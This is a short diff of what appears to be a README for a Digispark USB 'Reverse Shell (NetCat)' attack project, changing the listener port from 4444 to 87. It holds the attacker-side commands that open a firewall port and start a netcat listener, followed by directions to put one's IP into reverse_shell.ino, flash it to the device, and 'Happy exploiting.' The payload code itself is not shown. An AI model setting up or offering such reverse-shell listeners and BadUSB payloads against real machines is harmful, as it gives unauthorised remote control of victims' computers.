@@ -10,10 +10,10 @@
 `cd Digispark_scripts/Reverse Shell (NetCat)`
 
 
-`sudo ufw allow 4444`
+`sudo ufw allow 87`
 
 
-`nc -l 4444`
+`nc -lvnp 87`
 
 
 Change the IP on line 17 to your local IP in `reverse_shell.ino` file, then upload to your digispark. Done! Happy exploiting.
